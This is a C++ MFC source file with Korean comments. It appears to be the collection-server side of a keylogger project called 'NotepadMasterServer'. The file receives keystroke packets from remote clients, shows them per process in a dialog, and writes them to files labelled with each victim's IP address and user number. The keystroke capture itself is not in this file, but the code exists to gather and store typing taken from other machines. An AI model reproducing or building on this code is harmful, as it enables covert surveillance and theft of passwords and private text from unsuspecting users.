// CClientKeylog.cpp: 구현 파일
//

#include "pch.h"
#include "NotepadMasterServer.h"
#include "CClientKeylog.h"
#include "afxdialogex.h"

#include "definition.h"

// CClientKeylog 대화 상자

IMPLEMENT_DYNAMIC(CClientKeylog, CDialogEx)

CClientKeylog::CClientKeylog(CString process_name, CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_DIALOG_CLIENT_KEYLOG, pParent)
{
	this->process_name = process_name;
	m_client_keylog = _T("");
}

CClientKeylog::~CClientKeylog()
{
}

void CClientKeylog::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT_CLIENT_KEYLOG, m_edit_client_keylog);
}


BEGIN_MESSAGE_MAP(CClientKeylog, CDialogEx)
	ON_EN_VSCROLL(IDC_EDIT_CLIENT_KEYLOG, &CClientKeylog::OnVscrollEditClientKeylog)
END_MESSAGE_MAP()


// CClientKeylog 메시지 처리기

BOOL CClientKeylog::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// TODO:  여기에 추가 초기화 작업을 추가합니다.
	m_edit_client_keylog.SetSel(-1, -1, FALSE);
	return TRUE;  // return TRUE unless you set the focus to a control
				  // 예외: OCX 속성 페이지는 FALSE를 반환해야 합니다.
}

CString CClientKeylog::GetProcessName()
{
	// TODO: 여기에 구현 코드 추가.
	return process_name;
}

// 내부 키로그 데이터 출력
void CClientKeylog::PrintKeylog()
{
	// TODO: 여기에 구현 코드 추가.
	UpdateData(TRUE);

	SCROLLINFO sc_info;
	m_edit_client_keylog.GetScrollInfo(SB_VERT, &sc_info);
	m_edit_client_keylog.SetWindowTextW(m_client_keylog);
	m_edit_client_keylog.LineScroll(sc_info.nPos); // 원래 보고 있던 위치로 자동 스크롤
}

// 내부에 키로그 데이터 저장
void CClientKeylog::ScanKeylog(PDUKeylog* pdu)
{
	// TODO: 여기에 구현 코드 추가.
	if (pdu->state == VK_RETURN) // Line Feed 이면
		m_client_keylog += L"\x0d\x0a"; // CRLF로 만들어줌

	else
		m_client_keylog += pdu->state; // 내부에 키로그 기록
}

void CClientKeylog::OnVscrollEditClientKeylog()
{
	// TODO: 여기에 컨트롤 알림 처리기 코드를 추가합니다.
}

/* 키로그 데이터를 파일로 저장(단위 : 프로세스) */
void CClientKeylog::SaveKeylog(CString IP, int userNo, __time64_t timestamp)
{
	// TODO: 여기에 구현 코드 추가
	CString str;
	CStringA strA;

	TCHAR currentDir[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, currentDir);

	CFileException eex;
	CFile logfile;

	// (현재 디렉터리)/keylogs/[타임스탬프값] 폴더를 생성. 굳이굳이 2번 만들어야함
	CString FileDirectory = currentDir;
	FileDirectory.Format(TEXT("%s%s"), currentDir, TEXT("\\keylogs\\"));
	CreateDirectory(FileDirectory, NULL);
	FileDirectory.Format(TEXT("%s%d"), FileDirectory.GetBuffer(), timestamp);
	CreateDirectory(FileDirectory, NULL);

	str.Format(TEXT("%d"), userNo);
	if (!logfile.Open(FileDirectory + TEXT("\\[") + IP + TEXT("#") + str + TEXT("]") + process_name + TEXT(".txt"),
		CFile::modeWrite | CFile::modeCreate | CFile::shareExclusive | CFile::typeBinary, &eex))
	{
		eex.ReportError();
		return;
	}
	strA = m_client_keylog;
	logfile.Write(strA.GetBuffer(), strA.GetAllocLength());
	logfile.Close();
}
